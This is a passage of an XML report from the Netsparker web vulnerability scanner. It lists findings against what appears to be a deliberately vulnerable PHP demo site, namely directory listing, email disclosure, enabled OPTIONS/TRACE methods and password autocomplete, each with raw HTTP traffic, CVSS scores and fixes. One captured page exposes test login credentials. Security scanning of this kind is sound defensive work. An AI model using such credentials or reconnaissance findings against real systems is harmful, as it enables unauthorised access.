X-Scanner: Netsparker

]]&gt;</rawrequest>
					<rawresponse>

				        &lt;![CDATA[HTTP/1.1 200 OK
Server: Apache/2.2.8 (Win32) PHP/5.2.6
X-Powered-By: PHP/5.2.6
Content-Length: 2803
Content-Type: text/html
Date: Fri, 29 Jun 2018 03:11:37 GMT


&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Strict//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd&quot;&gt;
&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;
&lt;head&gt;
&lt;meta name=&quot;keywords&quot; content=&quot;&quot; /&gt;
&lt;meta name=&quot;description&quot; content=&quot;&quot; /&gt;
&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;
&lt;title&gt;Netsparker Test Web Site -  PHP&lt;/title&gt;
&lt;link href=&quot;style.css&quot; rel=&quot;stylesheet&quot; type=&quot;text/css&quot; media=&quot;screen&quot; /&gt;
&lt;/head&gt;&lt;link type=&quot;text/css&quot; href=&quot;Generics/style.css&quot; rel=&quot;stylesheet&quot;/&gt;
&lt;body&gt;
&lt;div id=&quot;wrapper&quot;&gt;

	&lt;div id=&quot;menu&quot;&gt;
		&lt;ul&gt;
			&lt;li&gt;&lt;a href=&quot;process.php?file=Generics/index.nsp&quot;&gt;Home&lt;/a&gt;&lt;/li&gt;
			&lt;li&gt;&lt;a href=&quot;hello.php?name=Visitor&quot;&gt;Hello&lt;/a&gt;&lt;/li&gt;
			&lt;li&gt;&lt;a href=&quot;products.php?pro=url&quot;&gt;Products&lt;/a&gt;&lt;/li&gt;
			&lt;li&gt;&lt;a href=&quot;process.php?file=Generics/about.nsp&quot;&gt;About&lt;/a&gt;&lt;/li&gt;
			&lt;li&gt;&lt;a href=&quot;process.php?file=Generics/contact.nsp&quot;&gt;Contact&lt;/a&gt;&lt;/li&gt;
			&lt;li&gt;&lt;a href=&quot;auth/&quot;&gt;Login&lt;/a&gt;&lt;/li&gt;
		&lt;/ul&gt;
	&lt;/div&gt;
	&lt;!-- end #menu --&gt;
	&lt;div id=&quot;header&quot;&gt;

	&lt;/div&gt;
	&lt;!-- end #header --&gt;	&lt;div id=&quot;page&quot;&gt;
	&lt;div id=&quot;page-bgtop&quot;&gt;
	&lt;div id=&quot;page-bgbtm&quot;&gt;
		&lt;div id=&quot;content&quot;&gt;
			&lt;div class=&quot;post&quot;&gt;
				&lt;h2 class=&quot;title&quot;&gt;&lt;a href=&quot;artist.php#&quot;&gt;Artist Service&lt;/a&gt;&lt;/h2&gt;

				&lt;div style=&quot;clear: both;&quot;&gt;&amp;nbsp;&lt;/div&gt;
				&lt;div class=&quot;entry&quot;&gt;
					&lt;p&gt;



no rows returned
                    &lt;/p&gt;

				&lt;/div&gt;
			&lt;/div&gt;
		&lt;div style=&quot;clear: both;&quot;&gt;&amp;nbsp;&lt;/div&gt;
		&lt;/div&gt;
		&lt;!-- end #content --&gt;

	&lt;div id=&quot;sidebar&quot;&gt;
			&lt;ul&gt;
				&lt;li&gt;
					&lt;div id=&quot;search&quot; &gt;
						&lt;form method=&quot;get&quot; action=&quot;artist.php&quot;&gt;
							&lt;div&gt;
								&lt;input type=&quot;text&quot; name=&quot;s&quot; id=&quot;search-text&quot; value=&quot;&quot; /&gt;
								&lt;input type=&quot;submit&quot; id=&quot;search-submit&quot; value=&quot;GO&quot; /&gt;
							&lt;/div&gt;
						&lt;/form&gt;

					&lt;/div&gt;
					&lt;div style=&quot;clear: both;&quot;&gt;&amp;nbsp;&lt;/div&gt;
				&lt;/li&gt;

â€¦&lt;/br&gt;]]&gt;
				    </rawresponse>
					<extrainformation>
					</extrainformation>

						<proofs></proofs>


						<classification>
							<OWASP2013></OWASP2013>
							<WASC></WASC>
							<CWE></CWE>
							<CAPEC></CAPEC>
							<PCI31></PCI31>
							<PCI32></PCI32>
							<HIPAA></HIPAA>
							<OWASPPC></OWASPPC>

								<CVSS>
									<vector>CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:C/C:L/I:N/A:N</vector>

									<score>
										<type>Base</type>
										<value>4.0</value>
										<severity>Medium</severity>
									</score>
									<score>
										<type>Temporal</type>
										<value>4.0</value>
										<severity>Medium</severity>
									</score>
									<score>
										<type>Environmental</type>
										<value>4.0</value>
										<severity>Medium</severity>
									</score>

								</CVSS>
						</classification>

				</vulnerability>
				<vulnerability confirmed="False">
					<url>http://php.testsparker.com/.svn/</url>
					<type>ApacheDirectoryListing</type>
					<severity>Information</severity>
					<certainty>90</certainty>
					<description><![CDATA[ &lt;p&gt;Netsparker identified a directory listing (Apache).&lt;/p&gt;&lt;p&gt;The web server responded with a list of files located in the target directory.&lt;/p&gt; ]]></description>
					<impact><![CDATA[ &lt;div&gt;An attacker can see the files located in the directory and could potentially access files which disclose sensitive information.&lt;/div&gt; ]]></impact>
					<actionsToTake><![CDATA[ &lt;div&gt;&lt;ol&gt;&lt;li&gt;&lt;p&gt;Change your server configuration file. A recommended configuration for the requested directory should be in the following format:&lt;/p&gt;&lt;pre class=&quot;xml code&quot;&gt;&amp;lt;Directory /{YOUR DIRECTORY}&amp;gt;
	Options FollowSymLinks
&amp;lt;/Directory&amp;gt;
&lt;/pre&gt;Remove the &lt;em&gt;Indexes&lt;/em&gt; option from configuration. Do not forget to remove &lt;em&gt;MultiViews&lt;/em&gt;, as well.&lt;/li&gt;&lt;li&gt;Configure the web server to disallow directory listing requests.&lt;/li&gt;&lt;li&gt;Ensure that the latest security patches have been applied to the web server and the current stable version of the software is in use.&lt;/li&gt;&lt;/ol&gt;&lt;/div&gt; ]]></actionsToTake>
					<remedy><![CDATA[  ]]></remedy>
					<requiredSkillsForExploitation><![CDATA[  ]]></requiredSkillsForExploitation>
					<externalReferences><![CDATA[ &lt;div&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&#39;http://www.webappsec.org/projects/threat/classes/directory_indexing.shtml&#39;&gt;WASC - Directory Indexing&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&#39;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CAN-2001-0729&#39;&gt;Apache Directory Listing Vulnerability&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/div&gt; ]]></externalReferences>
					<remedyReferences><![CDATA[  ]]></remedyReferences>
					<proofOfConcept><![CDATA[  ]]></proofOfConcept>

					<rawrequest>&lt;![CDATA[GET /.svn/ HTTP/1.1
Host: php.testsparker.com
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: en-us,en;q=0.5
Cache-Control: no-cache
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36
X-Scanner: Netsparker

]]&gt;</rawrequest>
					<rawresponse>

				        &lt;![CDATA[HTTP/1.1 200 OK
Server: Apache/2.2.8 (Win32) PHP/5.2.6
Content-Length: 1110
Content-Type: text/html;charset=UTF-8
Date: Fri, 29 Jun 2018 03:09:21 GMT

&lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD HTML 3.2 Final//EN&quot;&gt;
&lt;html&gt;
 &lt;head&gt;
  &lt;span class=&quot;highlight&quot;&gt;&lt;title&gt;Index of /.svn&lt;/title&gt;
 &lt;/head&gt;
 &lt;body&gt;
&lt;h1&gt;Index of /.svn&lt;/h1&gt;&lt;/span&gt;
&lt;table&gt;&lt;tr&gt;&lt;th&gt;&lt;img src=&quot;/icons/blank.gif&quot; alt=&quot;[ICO]&quot;&gt;&lt;/th&gt;&lt;th&gt;&lt;a href=&quot;?C=N;O=D&quot;&gt;Name&lt;/a&gt;&lt;/th&gt;&lt;th&gt;&lt;a href=&quot;?C=M;O=A&quot;&gt;Last modified&lt;/a&gt;&lt;/th&gt;&lt;th&gt;&lt;a href=&quot;?C=S;O=A&quot;&gt;Size&lt;/a&gt;&lt;/th&gt;&lt;th&gt;&lt;a href=&quot;?C=D;O=A&quot;&gt;Description&lt;/a&gt;&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th colspan=&quot;5&quot;&gt;&lt;hr&gt;&lt;/th&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign=&quot;top&quot;&gt;&lt;img src=&quot;/icons/back.gif&quot; alt=&quot;[DIR]&quot;&gt;&lt;/td&gt;&lt;td&gt;&lt;a href=&quot;/&quot;&gt;Parent Directory&lt;/a&gt;       &lt;/td&gt;&lt;td&gt;&amp;nbsp;&lt;/td&gt;&lt;td align=&quot;right&quot;&gt;  - &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign=&quot;top&quot;&gt;&lt;img src=&quot;/icons/unknown.gif&quot; alt=&quot;[   ]&quot;&gt;&lt;/td&gt;&lt;td&gt;&lt;a href=&quot;all-wcprops&quot;&gt;all-wcprops&lt;/a&gt;            &lt;/td&gt;&lt;td align=&quot;right&quot;&gt;22-Feb-2010 16:06  &lt;/td&gt;&lt;td align=&quot;right&quot;&gt;1.1K&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign=&quot;top&quot;&gt;&lt;img src=&quot;/icons/unknown.gif&quot; alt=&quot;[   ]&quot;&gt;&lt;/td&gt;&lt;td&gt;&lt;a href=&quot;entries&quot;&gt;entries&lt;/a&gt;                &lt;/td&gt;&lt;td align=&quot;right&quot;&gt;04-Mar-2010 18:55  &lt;/td&gt;&lt;td align=&quot;right&quot;&gt;1.6K&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;th colspan=&quot;5&quot;&gt;&lt;hr&gt;&lt;/th&gt;&lt;/tr&gt;
&lt;/table&gt;
&lt;address&gt;Apache/2.2.8 (Win32) PHP/5.2.6 Server at php.testsparker.com Port 80&lt;/address&gt;
&lt;/body&gt;&lt;/html&gt;
]]&gt;
				    </rawresponse>
					<extrainformation>
					</extrainformation>

						<proofs></proofs>


						<classification>
							<OWASP2013>A5</OWASP2013>
							<WASC>16</WASC>
							<CWE>548</CWE>
							<CAPEC>127</CAPEC>
							<PCI31></PCI31>
							<PCI32></PCI32>
							<HIPAA></HIPAA>
							<OWASPPC>C6</OWASPPC>

								<CVSS>
									<vector>CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N/E:H/RL:O/RC:C</vector>

									<score>
										<type>Base</type>
										<value>5.3</value>
										<severity>Medium</severity>
									</score>
									<score>
										<type>Temporal</type>
										<value>5.1</value>
										<severity>Medium</severity>
									</score>
									<score>
										<type>Environmental</type>
										<value>5.1</value>
										<severity>Medium</severity>
									</score>

								</CVSS>
						</classification>

				</vulnerability>
				<vulnerability confirmed="False">
					<url>http://php.testsparker.com/process.php?file=Generics/contact.nsp</url>
					<type>EmailDisclosure</type>
					<severity>Information</severity>
					<certainty>95</certainty>
					<description><![CDATA[ Netsparker identified an email address disclosure.
 ]]></description>
					<impact><![CDATA[ &lt;div&gt;
    Email addresses discovered within the application can be used by both spam email engines and also brute-force tools. Furthermore, valid email addresses may lead to social engineering attacks.
&lt;/div&gt;
 ]]></impact>
					<actionsToTake><![CDATA[  ]]></actionsToTake>
					<remedy><![CDATA[ &lt;div&gt;
    Use generic email addresses such as contact@ or info@ for general communications and remove user/people-specific email addresses from the website; should this be required, use submission forms for this purpose.
&lt;/div&gt;
 ]]></remedy>
					<requiredSkillsForExploitation><![CDATA[  ]]></requiredSkillsForExploitation>
					<externalReferences><![CDATA[ &lt;div&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&#39;https://en.wikipedia.org/wiki/E-mail_spam&#39;&gt;Wikipedia - Email Spam&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/div&gt; ]]></externalReferences>
					<remedyReferences><![CDATA[  ]]></remedyReferences>
					<proofOfConcept><![CDATA[  ]]></proofOfConcept>

					<rawrequest>&lt;![CDATA[GET /process.php?file=Generics/contact.nsp HTTP/1.1
Host: php.testsparker.com
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: en-us,en;q=0.5
Cache-Control: no-cache
Referer: http://php.testsparker.com/process.php?file=Generics/index.nsp
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36
X-Scanner: Netsparker

]]&gt;</rawrequest>
					<rawresponse>

				        &lt;![CDATA[
â€¦&lt;/br&gt; Stone QX
    Dos Tringulas
    EK7 AP0&lt;br /&gt;
    USA&lt;br /&gt;
   &lt;/p&gt;

   &lt;p&gt;
    &lt;span&gt;Tel: +44 123 456 7890&lt;/span&gt;&lt;br /&gt;
    &lt;span&gt;Fax: +44 123 456 7891&lt;/span&gt;&lt;/p&gt;
   &lt;p&gt;

&lt;p&gt;
				E-mail: &lt;span class=&quot;highlight&quot;&gt;test@testsparker.com&lt;/span&gt;&lt;/b&gt;&lt;/a&gt;&lt;/p&gt;
					&lt;/p&gt;

				&lt;/div&gt;
			&lt;/div&gt;
		&lt;div style=&quot;clear: both;&quot;&gt;&amp;nbsp;&lt;/div&gt;
		&lt;/div&gt;
		&lt;!-- end #content --&gt;

	&lt;div id=&quot;sidebar&quot;&gt;
			&lt;ul&gt;
				&lt;li&gt;
					&lt;div id=&quot;search&quot;
â€¦&lt;/br&gt;]]&gt;
				    </rawresponse>
					<extrainformation>
							<info name="Email Address(es)">&lt;![CDATA[test@testsparker.com]]&gt;</info>
					</extrainformation>

						<proofs></proofs>


						<classification>
							<OWASP2013></OWASP2013>
							<WASC>13</WASC>
							<CWE>200</CWE>
							<CAPEC>118</CAPEC>
							<PCI31></PCI31>
							<PCI32></PCI32>
							<HIPAA></HIPAA>
							<OWASPPC>C7</OWASPPC>

								<CVSS>
									<vector>CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N</vector>

									<score>
										<type>Base</type>
										<value>5.3</value>
										<severity>Medium</severity>
									</score>
									<score>
										<type>Temporal</type>
										<value>5.3</value>
										<severity>Medium</severity>
									</score>
									<score>
										<type>Environmental</type>
										<value>5.3</value>
										<severity>Medium</severity>
									</score>

								</CVSS>
						</classification>

				</vulnerability>
				<vulnerability confirmed="True">
					<url>http://php.testsparker.com/robots.txt</url>
					<type>RobotsIdentified</type>
					<severity>Information</severity>
					<certainty>100</certainty>
					<description><![CDATA[ &lt;p&gt;Netsparker detected a &lt;code&gt;Robots.txt&lt;/code&gt; file with potentially sensitive content.&lt;/p&gt; ]]></description>
					<impact><![CDATA[ &lt;div&gt;&lt;span style=&quot;font-weight: 400;&quot; data-mce-style=&quot;font-weight: 400;&quot;&gt;Depending on the content of the file, an attacker might discover hidden directories and files.&lt;/span&gt;&lt;/div&gt; ]]></impact>
					<actionsToTake><![CDATA[  ]]></actionsToTake>
					<remedy><![CDATA[ &lt;div&gt;&lt;span style=&quot;font-weight: 400;&quot; data-mce-style=&quot;font-weight: 400;&quot;&gt;Ensure you have nothing sensitive exposed within this file, such as the path of an administration panel. If disallowed paths are sensitive and you want to keep it from unauthorized access, do not write them in the &lt;code&gt;Robots.txt&lt;/code&gt;, and ensure they are correctly protected by means of authentication.&lt;/span&gt;&lt;/div&gt;&lt;div&gt;&lt;p&gt;&lt;span style=&quot;font-weight: 400;&quot; data-mce-style=&quot;font-weight: 400;&quot;&gt;&lt;code&gt;Robots.txt&lt;/code&gt; is only used to instruct search robots which resources should be indexed and which ones are not.&lt;/span&gt;&lt;/p&gt;&lt;span style=&quot;font-weight: 400;&quot; data-mce-style=&quot;font-weight: 400;&quot;&gt;The following block can be used to tell the crawler to index files under /web/ and &lt;/span&gt;&lt;strong&gt;ignore the rest&lt;/strong&gt;&lt;span style=&quot;font-weight: 400;&quot; data-mce-style=&quot;font-weight: 400;&quot;&gt;:&lt;/span&gt;&lt;br&gt;&lt;/div&gt;&lt;pre&gt;User-Agent: *&lt;br&gt;Allow: /web/&lt;br&gt;Disallow: /&lt;/pre&gt;&lt;div&gt;&lt;p&gt;&lt;span style=&quot;font-weight: 400;&quot; data-mce-style=&quot;font-weight: 400;&quot;&gt;Please note that when you use the instructions above, &lt;/span&gt;&lt;strong&gt;search engines will not index your website &lt;/strong&gt;&lt;span style=&quot;font-weight: 400;&quot; data-mce-style=&quot;font-weight: 400;&quot;&gt;except for the specified directories.&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-weight: 400;&quot; data-mce-style=&quot;font-weight: 400;&quot;&gt;If you want to hide certain section of the website from the search engines &lt;code&gt;X-Robots-Tag&lt;/code&gt; can be set in the response header to tell crawlers whether the file should be indexed or not:&lt;/span&gt;&lt;br&gt;&lt;/p&gt;&lt;/div&gt;&lt;pre&gt;X-Robots-Tag: googlebot: nofollow&lt;br&gt;X-Robots-Tag: otherbot: noindex, nofollow&lt;br&gt;&lt;/pre&gt;&lt;div&gt;&lt;p&gt;&lt;span style=&quot;font-weight: 400;&quot; data-mce-style=&quot;font-weight: 400;&quot;&gt;By using &lt;code&gt;X-Robots-Tag&lt;/code&gt; you don&#39;t have to list the these files in your &lt;code&gt;Robots.txt&lt;/code&gt;. &lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-weight: 400;&quot; data-mce-style=&quot;font-weight: 400;&quot;&gt;It is also not possible to prevent media files from being indexed by putting using Robots Meta Tags. &lt;code&gt;X-Robots-Tag&lt;/code&gt; resolves this issue as well.&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-weight: 400;&quot; data-mce-style=&quot;font-weight: 400;&quot;&gt;For Apache, the following snippet can be put into &lt;code&gt;httpd.conf&lt;/code&gt; or an &lt;code&gt;.htaccess&lt;/code&gt; file to restrict crawlers to index multimedia files without exposing them in &lt;code&gt;Robots.txt&lt;/code&gt;&lt;/span&gt;&lt;br&gt;&lt;/p&gt;&lt;/div&gt;&lt;pre&gt;&amp;lt;Files ~ &quot;\.pdf$&quot;&amp;gt;&lt;br&gt; # Don&#39;t index PDF files.&lt;br&gt; Header set X-Robots-Tag &quot;noindex, nofollow&quot;&lt;br&gt;&amp;lt;/Files&amp;gt;&lt;/pre&gt;&lt;pre&gt;&amp;lt;Files ~ &quot;\.(png|jpe?g|gif)$&quot;&amp;gt;&lt;br&gt; #Don&#39;t index image files.&lt;br&gt; Header set X-Robots-Tag &quot;noindex&quot;&lt;br&gt;&amp;lt;/Files&amp;gt;&lt;/pre&gt;&lt;div&gt; &lt;br&gt;&lt;/div&gt; ]]></remedy>
					<requiredSkillsForExploitation><![CDATA[  ]]></requiredSkillsForExploitation>
					<externalReferences><![CDATA[ &lt;div&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&#39;https://developers.google.com/webmasters/control-crawl-index/&#39;&gt;Controlling Crawling and Indexing &lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&#39;https://www.searchenginejournal.com/x-robots-tag-simple-alternate-robots-txt-meta-tag/67138/&#39;&gt;X-Robots-Tag: A Simple Alternate For Robots .txt and Meta Tag&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/div&gt; ]]></externalReferences>
					<remedyReferences><![CDATA[  ]]></remedyReferences>
					<proofOfConcept><![CDATA[  ]]></proofOfConcept>

					<rawrequest>&lt;![CDATA[GET /robots.txt HTTP/1.1
Host: php.testsparker.com
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: en-us,en;q=0.5
Cache-Control: no-cache
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36
X-Scanner: Netsparker

]]&gt;</rawrequest>
					<rawresponse>

				        &lt;![CDATA[HTTP/1.1 200 OK
Server: Apache/2.2.8 (Win32) PHP/5.2.6
Content-Length: 26
Last-Modified: Sat, 19 Feb 2011 12:59:17 GMT
Accept-Ranges: bytes
Content-Type: text/plain
Date: Fri, 29 Jun 2018 03:09:20 GMT
ETag: &quot;30000000199ef-1a-49ca232cb73c3&quot;

&lt;span class=&quot;highlight&quot;&gt;User-agent:&lt;/span&gt; *
&lt;span class=&quot;highlight&quot;&gt;Disallow:&lt;/span&gt; /]]&gt;
				    </rawresponse>
					<extrainformation>
							<info name="Interesting Robots.txt Entries">&lt;![CDATA[Disallow: /]]&gt;</info>
					</extrainformation>

						<proofs></proofs>


						<classification>
							<OWASP2013></OWASP2013>
							<WASC></WASC>
							<CWE></CWE>
							<CAPEC></CAPEC>
							<PCI31></PCI31>
							<PCI32></PCI32>
							<HIPAA></HIPAA>
							<OWASPPC>C7</OWASPPC>

						</classification>

				</vulnerability>
				<vulnerability confirmed="True">
					<url>http://php.testsparker.com/.svn/</url>
					<type>OptionsMethodEnabled</type>
					<severity>Information</severity>
					<certainty>100</certainty>
					<description><![CDATA[ &lt;p&gt;Netsparker detected that &lt;code&gt;OPTIONS&lt;/code&gt; method is allowed. This issue is reported as extra information.&lt;/p&gt; ]]></description>
					<impact><![CDATA[ &lt;div&gt;Information disclosed from this page can be used to gain additional information about the target system.&lt;/div&gt; ]]></impact>
					<actionsToTake><![CDATA[  ]]></actionsToTake>
					<remedy><![CDATA[ &lt;div&gt;Disable &lt;code&gt;OPTIONS&lt;/code&gt; method in all production systems.&lt;/div&gt; ]]></remedy>
					<requiredSkillsForExploitation><![CDATA[  ]]></requiredSkillsForExploitation>
					<externalReferences><![CDATA[ &lt;div&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&#39;https://www.owasp.org/index.php/Testing_for_HTTP_Methods_and_XST_(OWASP-CM-008)&#39;&gt;Testing for HTTP Methods and XST (OWASP-CM-008)&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&#39;https://www.w3.org/Protocols/rfc2616/rfc2616-sec9.html&#39;&gt;HTTP/1.1: Method Definitions&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/div&gt; ]]></externalReferences>
					<remedyReferences><![CDATA[  ]]></remedyReferences>
					<proofOfConcept><![CDATA[  ]]></proofOfConcept>

					<rawrequest>&lt;![CDATA[OPTIONS /.svn/ HTTP/1.1
Host: php.testsparker.com
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: en-us,en;q=0.5
Cache-Control: no-cache
Content-Length: 0
Cookie: PHPSESSID=cc357e5fc0d8f52676e059eed885e5be
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36
X-Scanner: Netsparker

]]&gt;</rawrequest>
					<rawresponse>

				        &lt;![CDATA[HTTP/1.1 200 OK
Server: Apache/2.2.8 (Win32) PHP/5.2.6
Allow: GET,HEAD,POST,OPTIONS,TRACE
Content-Length: 0
Content-Type: httpd/unix-directory
Date: Fri, 29 Jun 2018 03:10:08 GMT

]]&gt;
				    </rawresponse>
					<extrainformation>
							<info name="Allowed methods">&lt;![CDATA[GET,HEAD,POST,OPTIONS,TRACE]]&gt;</info>
					</extrainformation>

						<proofs></proofs>


						<classification>
							<OWASP2013>A5</OWASP2013>
							<WASC>14</WASC>
							<CWE>16</CWE>
							<CAPEC>107</CAPEC>
							<PCI31></PCI31>
							<PCI32></PCI32>
							<HIPAA></HIPAA>
							<OWASPPC></OWASPPC>

						</classification>

				</vulnerability>
				<vulnerability confirmed="True">
					<url>http://php.testsparker.com/auth/login.php</url>
					<type>AutoCompleteEnabledPasswordField</type>
					<severity>Information</severity>
					<certainty>100</certainty>
					<description><![CDATA[ &lt;p&gt;Netsparker detected that autocomplete is enabled in one or more of the password fields.&lt;/p&gt; ]]></description>
					<impact><![CDATA[ &lt;p&gt;If user chooses to save, data entered in these fields will be cached by the browser. An attacker who can access the victim&#39;s browser could steal this information. This is especially important if the application is commonly used in shared computers, such as cyber cafes or airport terminals.&lt;/p&gt; ]]></impact>
					<actionsToTake><![CDATA[ &lt;div&gt;&lt;ol&gt;&lt;li&gt;Add the attribute &lt;code&gt;autocomplete=&quot;off&quot;&lt;/code&gt; to the form tag or to individual &quot;input&quot; fields. However, since early 2014, major browsers don&#39;t respect this instruction, due to their integrated password management mechanism, and offer to users to store password internally.&lt;/li&gt;&lt;li&gt;Re-scan the application after addressing the identified issues to ensure all of the fixes have been applied properly.&lt;/li&gt;&lt;/ol&gt;&lt;/div&gt; ]]></actionsToTake>
					<remedy><![CDATA[  ]]></remedy>
					<requiredSkillsForExploitation><![CDATA[ &lt;div&gt;First and foremost, attacker needs either physical access or user-level code execution rights for successful exploitation. Dumping all data from a browser can be fairly easy, and a number of automated tools exist to undertake this. Where the attacker cannot dump the data, he/she could still browse the recently visited websites and activate the autocomplete feature to see previously entered values.&lt;/div&gt; ]]></requiredSkillsForExploitation>
					<externalReferences><![CDATA[ &lt;div&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&#39;https://msdn.microsoft.com/en-us/library/ms533032(VS.85).aspx&#39;&gt;Using Autocomplete in HTML Forms&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&#39;https://developer.mozilla.org/en-US/docs/Web/Security/Securing_your_site/Turning_off_form_autocompletion&#39;&gt;How to Turn Off Form Autocompletion&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/div&gt; ]]></externalReferences>
					<remedyReferences><![CDATA[  ]]></remedyReferences>
					<proofOfConcept><![CDATA[  ]]></proofOfConcept>

					<rawrequest>&lt;![CDATA[GET /auth/login.php HTTP/1.1
Host: php.testsparker.com
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: en-us,en;q=0.5
Cache-Control: no-cache
Referer: http://php.testsparker.com/auth/
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36
X-Scanner: Netsparker

]]&gt;</rawrequest>
					<rawresponse>

				        &lt;![CDATA[
â€¦&lt;/br&gt;  Enter your credentials (admin / admin123456)
    &lt;br/&gt;
    &lt;form method=&quot;POST&quot; action=&quot;control.php&quot;&gt;
      Username: &lt;input type=&quot;text&quot; name=&quot;username&quot;/&gt;
      &lt;br/&gt;
      Password:&amp;nbsp;&amp;nbsp;&lt;span class=&quot;highlight&quot;&gt;&lt;input type=&quot;password&quot; name=&quot;password&quot;/&gt;&lt;/span&gt;
&lt;!-- Test credentials --&gt;
&lt;!-- Password: admin123456 --&gt;
      &lt;br/&gt;
      &lt;br/&gt;
      &lt;input type=&quot;submit&quot; value=&quot;SUBMIT&quot;&gt;
    &lt;/form&gt;
                    &lt;/p&gt;

				&lt;div style=&quot;clear: both;
â€¦&lt;/br&gt;]]&gt;
				    </rawresponse>
					<extrainformation>
							<info name="Identified Field Name">&lt;![CDATA[password]]&gt;</info>
					</extrainformation>

						<proofs></proofs>


						<classification>
							<OWASP2013>A5</OWASP2013>
							<WASC>15</WASC>
							<CWE>16</CWE>
							<CAPEC></CAPEC>
							<PCI31></PCI31>
							<PCI32></PCI32>
							<HIPAA></HIPAA>
							<OWASPPC></OWASPPC>

								<CVSS>
									<vector>CVSS:3.0/AV:P/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N</vector>

									<score>
										<type>Base</type>
										<value>4.6</value>
										<severity>Medium</severity>
									</score>
									<score>
										<type>Temporal</type>
										<value>4.6</value>
										<severity>Medium</severity>
									</score>
									<score>
										<type>Environmental</type>
										<value>4.6</value>
										<severity>Medium</severity>
									</score>

								</CVSS>
						</classification>

				</vulnerability>
				<vulnerability confirmed="False">
					<url>http://php.testsparker.com/</url>
					<type>ApacheIdentified</type>
					<severity>Information</severity>
					<certainty>90</certainty>
					<description><![CDATA[ &lt;p&gt;Netsparker identified a web server (Apache) in the target web server&#39;s HTTP response.&lt;/p&gt; ]]></description>
					<impact><![CDATA[ &lt;div&gt;This issue is reported as additional information only. There is no direct impact arising from this issue.&lt;/div&gt; ]]></impact>
					<actionsToTake><![CDATA[  ]]></actionsToTake>
					<remedy><![CDATA[  ]]></remedy>
					<requiredSkillsForExploitation><![CDATA[  ]]></requiredSkillsForExploitation>
					<externalReferences><![CDATA[ &lt;div&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&#39;https://httpd.apache.org/docs/2.2/mod/core.html#servertokens&#39;&gt;Apache ServerTokens Directive&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/div&gt; ]]></externalReferences>
					<remedyReferences><![CDATA[  ]]></remedyReferences>
					<proofOfConcept><![CDATA[  ]]></proofOfConcept>

					<rawrequest>&lt;![CDATA[GET / HTTP/1.1
Host: php.testsparker.com
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: en-us,en;q=0.5
Cache-Control: no-cache
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36
X-Scanner: Netsparker

]]&gt;</rawrequest>
					<rawresponse>

				        &lt;![CDATA[HTTP/1.1 200 OK
&lt;span class=&quot;highlight&quot;&gt;Server: Apache&lt;/span&gt;/2.2.8 (Win32) PHP/5.2.6
X-Powered-By: PHP/5.2.6
Content-Length: 144
Content-Type: text/html
Date: Fri, 29 Jun 2018 03:09:14 GMT

&lt;html&gt;
&lt;HEAD&gt;
